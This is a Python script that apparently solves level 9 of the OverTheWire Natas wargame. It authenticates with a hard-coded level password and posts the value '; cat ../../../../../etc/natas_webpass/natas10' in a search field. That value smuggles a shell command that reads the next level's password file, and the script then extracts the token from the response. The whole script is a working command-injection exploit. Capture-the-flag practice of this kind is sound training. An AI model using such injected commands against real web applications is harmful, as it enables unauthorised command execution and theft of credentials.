import requests
import re

username = "natas9"
password = "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl"
url = "http://%s.natas.labs.overthewire.org/"  % username

session = requests.Session()

response = session.get(url,auth=(username,password))
print(response.text) # get the secret
print("="*50)

source = "index-source.html"
response = session.get(url+source,auth=(username,password))
print(response.text) # get the secret
print("="*50)

cmd = "; cat ../../../../../etc/natas_webpass/natas10"
response = session.post(url,auth=(username,password),data={"needle":cmd})
print(response.text)
print("="*50)

# Just Code Printing
code = re.findall(r"[A-Za-z0-9]{32}", response.text)[1]
print("The code for the next level is: " + code)